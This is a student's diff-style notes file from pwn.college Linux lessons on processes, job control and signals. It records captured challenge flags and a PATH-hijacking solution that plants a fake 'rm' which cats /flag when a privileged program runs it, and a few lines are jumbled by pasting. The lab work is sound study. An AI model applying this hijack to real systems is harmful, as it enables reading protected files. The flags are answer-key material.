@@ -1,0 +1,25 @@
+processes and jobs
+OS execute software split into kernels and processes. In linux, the running programs are tracked as processes or background jobs , which can be monitored , controlled , backgrounded,and terminated using shell operations
+solve:
+ps aux , ps-ef display target process IDs and command parameters 
+Job control signals can be suspend processes using cntrl+z and send them background (bg) or bring them foreground (fg). 
+SIGTERM can be sent to kill the PIDS
+ps aux
+pwn.college{caGfSXhZ4XTEuCREK-ILd7AN0xW.QX4MDO0wCM3AzNwIzW}
+ /challenge/run
+ pwn.college{UPHOk6TIh5wN-2ViVsIUMIjET71.QX2cDM1wCM3AzNwIzW}
+/chacat /challenge/paths/24660/flag
+pwn.college{Y6naLADVFYO8PSheXMw_m6LtHol.01NzEzNxwCM3AzNwIzW}llenge/paths/24660/win
+echo "/bin/cat /flag" > rm
+hacker@path~hijacking-commands:~$ chmod +x rm
+hacker@path~hijacking-commands:~$ PATH=.:$PATH
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /home/hacker/rm. Executing!
+pwn.college{wA7uJ66UB9Ah7Jex8zMBZpNK0dZ.QX3cjM1wCM3AzNwIzW}
+concept learnt 
+learnt about PID's 
+managing job state using bg and fg along with cntrl + Z 
+then using SIGTERM to kill PID's
+references : 
+pwn.college tutorials and chrome
